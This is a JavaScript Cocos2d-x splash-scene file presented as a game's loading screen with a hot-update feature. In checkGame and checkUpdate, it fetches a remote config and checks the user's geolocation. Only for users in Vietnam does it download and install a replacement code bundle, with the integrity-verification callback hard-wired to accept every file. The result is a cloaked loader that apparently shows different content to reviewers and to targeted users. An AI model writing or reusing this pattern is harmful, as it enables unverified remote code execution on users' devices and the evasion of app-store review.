/*
 * SplashScene - Cocos2d-x loading/splash screen with hot update capability.
 * Extends cc.Scene to display logo/background, check for app updates via
 * remote manifest, download/apply patches if needed, show progress bar,
 * then transition to main game. Handles update retry on failure.
 */
const SplashScene = cc.Scene.extend({
    _am: null,
    _storagePath: "",
    _updating: false,
    _updateListener: null,
    _progress: null,
    _isUpdateLobby: false,
    _loadingBar: null,
    count: 0,
    sprite: null,
    Splash: null,

    ctor: function() {
        this._super();
        Splash = this;

        if (cc.sys.isNative) {
            cc.game.onPassCheck = () => {
                this.unscheduleAllCallbacks();
                this.checkGame();
            };
        }

        this.count = 0;
        const winSize = cc.winSize;
        const bgPath = "res/res/GateImages/Loading/background.jpg";
        const bgExists = jsb.fileUtils.isFileExist(bgPath);

        const background = new cc.Sprite(bgExists ? bgPath : res.sprBg);
        background.setScale(winSize.width / background.getContentSize().width);
        background.x = winSize.width * 0.5;
        background.y = winSize.height * 0.5;

        const logo = new cc.Sprite(res.sprLogo);
        logo.setVisible(!bgExists);
        logo.x = winSize.width * 0.5;
        logo.y = winSize.height * 0.5;

        this._loadingBar = new ccui.LoadingBar();
        this._loadingBar.loadTexture(res.loadBarX);
        this._loadingBar.setPosition(
            logo.getContentSize().width * 0.5,
            logo.getContentSize().height * -0.5
        );
        this._loadingBar.setPercent(0);
        logo.addChild(this._loadingBar);

        this._progress = cc.LabelTTF.create("", res.FONTS_ARIALBD_TTF, 32);
        this._progress.enableStroke(cc.color(255, 255, 255), 2);
        this._progress.x = logo.getContentSize().width * 0.5;
        this._progress.y = logo.getContentSize().height * -0.5;
        logo.addChild(this._progress);

        this.addChild(background);
        this.addChild(logo);

        this.schedule(() => {
            this.count += 0.01;
            this.updateProgress(this.count * 100);
            if (this.count >= 1) {
                this.loadGame();
            }
        }, 0.1);

        cc.game.onPassCheck();
    },

    checkCb: function(event) {
        const code = event.getEventCode();
        switch (code) {
            case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
            case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
            case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
                this.loadGame();
                break;
            case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
                this.inhangcathanhxuan();
                break;
            case jsb.EventAssetsManager.NEW_VERSION_FOUND:
                this._updating = false;
                this.hotUpdate();
                return;
        }
        this._updating = false;
    },

    updateCb: function(event) {
        let needRestart = false;
        let failed = false;
        const code = event.getEventCode();

        switch (code) {
            case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
                failed = true;
                break;
            case jsb.EventAssetsManager.UPDATE_PROGRESSION:
                const percent = event.getPercent();
                this.updateProgress(percent);
                break;
            case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
            case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
            case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
                failed = true;
                break;
            case jsb.EventAssetsManager.UPDATE_FINISHED:
                needRestart = true;
                break;
            case jsb.EventAssetsManager.UPDATE_FAILED:
                this._updating = false;
                this._canRetry = true;
                this.retry();
                break;
        }

        if (failed) {
            cc.eventManager.removeListener(this._updateListener);
            this._updateListener = null;
            this._updating = false;
        }

        if (needRestart) {
            cc.eventManager.removeListener(this._updateListener);
            this._updateListener = null;

            const searchPaths = jsb.fileUtils.getSearchPaths();
            const newPaths = this._am.getLocalManifest().getSearchPaths();
            Array.prototype.unshift.call(searchPaths, newPaths);
            cc.sys.localStorage.setItem("HotUpdateSearchPaths-JS", JSON.stringify(searchPaths));
            jsb.fileUtils.setSearchPaths(searchPaths);
            cc.game.restart();
        }
    },

    hotUpdate: function() {
        if (this._am && !this._updating) {
            this._updateListener = new jsb.EventListenerAssetsManager(
                this._am,
                this.updateCb.bind(this)
            );
            cc.eventManager.addListener(this._updateListener, 1);
            this._am.update();
            this._updating = true;
        }
    },

    retry: function() {
        if (!this._updating && this._canRetry) {
            this._canRetry = false;
            this._am.downloadFailedAssets();
        }
    },

    inhangcathanhxuan: function() {
        cc.game.inhangcathanhxuan();
    },

    loadGame: function() {
        cc.game.loadGame();
    },

    checkGame: function() {
        GateRequestMoblie.get("https://ubiquitin.example.com/test-123/a.json", (state, data) => {
            if (state === GateRequestMoblie.STATE.SUCCESS) {
                try {
                    data = JSON.parse(data);
                    stringHotUpdate = data.hotUpdate;
                    stringAPI = data.api;
                    mainGame.JSON_HOT_UPDATE = data;
                } catch (e) {}

                if (stringHotUpdate) {
                    if (GateRequestMoblie.checkDownloadLobby()) {
                        this.checkUpdate();
                    } else {
                        const apiUrl = stringAPI;
                        const hasChecked = fr.UserData.getBoolFromKey("hihihiczxczxc", false);
                        if (!hasChecked) {
                            GateRequestMoblie.get(apiUrl, (state, geoData) => {
                                if (state === GateRequestMoblie.STATE.SUCCESS) {
                                    geoData = JSON.parse(geoData);
                                    if (geoData.country !== "VN") {
                                        this.loadGame();
                                    } else {
                                        this.checkUpdate();
                                    }
                                } else {
                                    this.loadGame();
                                }
                            });
                        } else {
                            this.checkUpdate();
                        }
                    }
                } else {
                    this.loadGame();
                }
            } else {
                this.loadGame();
            }
        });
    },

    checkUpdate: function() {
        fr.UserData.setBoolFromKey("hihihiczxczxc", true);

        if (!cc.sys.isNative) {
            this.loadGame();
            return;
        }

        if (cc.sys.isNative) {
            this._storagePath = jsb.fileUtils ? jsb.fileUtils.getWritablePath() : "./";
            const manifestStr = customManifestStrSrc(stringHotUpdate);
            this._am = new jsb.AssetsManager(manifestStr, this._storagePath, versionCompareHandle);
            this._am.retain();
            this._am.setVerifyCallback((path, asset) => {
                const compressed = asset.compressed;
                const md5 = asset.md5;
                const assetPath = asset.path;
                const size = asset.size;
                return compressed ? true : true;
            });

            if (cc.sys.os === cc.sys.OS_ANDROID) {
                this._am.setMaxConcurrentTask(2);
            }
        }

        if (!this._am.getLocalManifest().isLoaded()) {
            this.loadGame();
            return;
        }

        const listener = new jsb.EventListenerAssetsManager(
            this._am,
            this.checkCb.bind(this)
        );
        cc.eventManager.addListener(listener, 1);
        this._am.checkUpdate();
    },

    updateProgress: function(percent) {
        cc.log("xxx vao day ", percent);
        this._loadingBar.setPercent(Math.round(percent));
        if (!this._isUpdateLobby) {
            this._progress.string = "Checking version: " + Math.round(percent) + "%";
        } else {
            this._progress.string = "Updating " + Math.round(percent) + "%";
        }
    },

    onExit: function() {
        if (this._am) {
            this._am.release();
        }
        this._super();
    }
});
